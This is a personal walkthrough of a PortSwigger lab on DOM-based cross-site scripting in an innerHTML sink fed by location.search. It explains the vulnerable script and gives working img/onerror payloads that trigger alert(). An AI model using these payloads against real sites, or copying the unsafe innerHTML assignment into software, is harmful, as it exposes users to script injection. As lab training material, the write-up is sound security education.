---
title: LAB 0.5
aliases:
  - LAB 0.5
tags:
  - XSS
  - Labs
  - DOM-Based
  - Apprentice
description: "Lab: DOM XSS in innerHTML sink using source location.search"
---
# Lab: DOM XSS in `innerHTML` sink using source `location.search`.
---
[LAB](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

This lab contains a DOM-based cross-site scripting vulnerability in the search blog functionality. It uses an `innerHTML` assignment, which changes the HTML contents of a `div` elem
![[images/Pasted image 20241229130358.png]]

# Solution
---

## Getting Started

When you open the lab, you’ll see a simple blog page with a search bar. To begin, enter a random string into the search bar. Eg. `test`

![[images/Pasted image 20241229142953.png]]

Next, right-click on the search result and select **Inspect** from the context menu. This will open your browser's DOM inspector. If your query isn’t already highlighted, use the DOM search bar to locate it.

![[images/Pasted image 20241229143117.png]]

You’ll notice that your query is enclosed in its own `<span>` element, just as you typed it:

```html
<span id="searchMessage">test</span>
```

---

## Understanding `innerHTML` and `outerHTML`

Before we proceed, let’s briefly discuss `innerHTML` and `outerHTML`. If you’re already familiar with these concepts, feel free to skip ahead.

In the DOM inspector, right-click on an `<h1>` element, go to **Copy**, and choose either **Copy innerHTML** or **Copy outerHTML**. Here’s what happens when you copy `innerHTML`:

```html
<span>0 search results for '</span><span id="searchMessage">test</span><span>'</span>
```

If you chose `outerHTML`, it would include the `<h1>` tags as well. The lab description’s reference to an “innerHTML assignment” simply means that the `innerHTML` property is being used to dynamically insert content - content that could include HTML, making it a potential security risk.

---

## Crafting the Payload

Let’s build on what we learned in the previous DOM XSS lab, [[LAB 0.3]]. This time, I decided to modify the payload slightly. By removing the first two characters (`">`), we can simplify it:

**Original Payload:**

```html
"><img src=x onerror=alert(1)>
```

**New Payload:**

```html
<img src=x onerror=alert(1)>
```

This makes sense because our search query is already nested between tags (`…>test<…`). There’s no need to break out of anything.

Here’s what the payload looks like when inserted:

```html
<span id="searchMessage"><img src=x onerror=alert(1)></span>
```

Now, enter the shortened payload into the search bar, and voila!

![[images/Pasted image 20241229143736.png]]

---

## Lab Breakdown

Here’s the HTML and JavaScript in action:

```html
<h1>
    <span>0 search results for '</span>
    <span id="searchMessage">
        <img src="x" onerror="alert('MardukWasHere')">
    </span>
    <span>'</span>
</h1>
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if (query) {
        doSearchQuery(query);
    }
</script>
<hr>
```

The `innerHTML` assignment dynamically injects our malicious payload, triggering the `alert` function.

---

And that’s it! Another lab solved. Congrats! 🎉
